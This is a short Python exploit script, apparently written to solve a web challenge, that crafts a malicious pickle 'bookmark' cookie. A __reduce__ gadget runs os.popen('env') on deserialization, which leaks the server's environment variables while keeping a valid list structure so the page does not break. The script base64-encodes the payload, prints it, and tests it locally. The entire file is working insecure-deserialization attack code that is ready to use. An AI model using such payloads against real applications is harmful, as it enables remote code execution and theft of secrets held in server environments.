import pickle
import base64
import os

# Define a class that executes env when deserialized
class PickleGadget:
    def __reduce__(self):
        # Execute env command and wrap result in a list to maintain bookmark structure
        return (
            list,  # Use list constructor
            (  # Pass a tuple containing the env output
                __import__('os').popen('env').read(),
            )
        )

# Create the payload
payload = PickleGadget()

# Serialize to pickle
pickle_data = pickle.dumps(payload, protocol=4)

# Base64 encode
payload_b64 = base64.b64encode(pickle_data).decode()

print(f"[+] Original bookmark cookie: gARdlC4=")
print(f"[+] New malicious bookmark cookie: {payload_b64}")
print(f"\n[+] Verification - Testing deserialization...")

# Test the payload
test_pickle = base64.b64decode(payload_b64)
result = pickle.loads(test_pickle)

print(f"[+] Result type: {type(result)}")
print(f"[+] Result: {result[:200]}..." if len(str(result)) > 200 else f"[+] Result: {result}")

# Show what the payload does during deserialization
print(f"\n[!] Payload behavior:")
print(f"   - Executes: os.popen('env').read()")
print(f"   - Returns type: list")
print(f"   - Maintains valid bookmark structure")

# Alternative simpler version
class SimpleGadget:
    def __reduce__(self):
        return (
            list,
            (__import__('os').popen('env').read(),)
        )

simple_payload = base64.b64encode(pickle.dumps(SimpleGadget(), protocol=4)).decode()
print(f"\n[+] Alternative simpler payload: {simple_payload}")

# Show the decoded pickle structure
print(f"\n[+] Decoded pickle data (hex): {pickle_data.hex()}")
print(f"[+] Base64 length: {len(payload_b64)}")

# Test both payloads produce valid list structure
print(f"\n[=== Testing Payload Structures ===]")
test1 = pickle.loads(base64.b64decode(payload_b64))
test2 = pickle.loads(base64.b64decode(simple_payload))

print(f"Payload 1 - Type: {type(test1)}, Length: {len(test1) if hasattr(test1, '__len__') else 'N/A'}")
print(f"Payload 2 - Type: {type(test2)}, Length: {len(test2) if hasattr(test2, '__len__') else 'N/A'}")

# Verify they don't break on first access
if isinstance(test1, list):
    print(f"✓ Payload 1 maintains valid list structure: {test1[:100]}...")
if isinstance(test2, list):
    print(f"✓ Payload 2 maintains valid list structure: {test2[:100]}...")
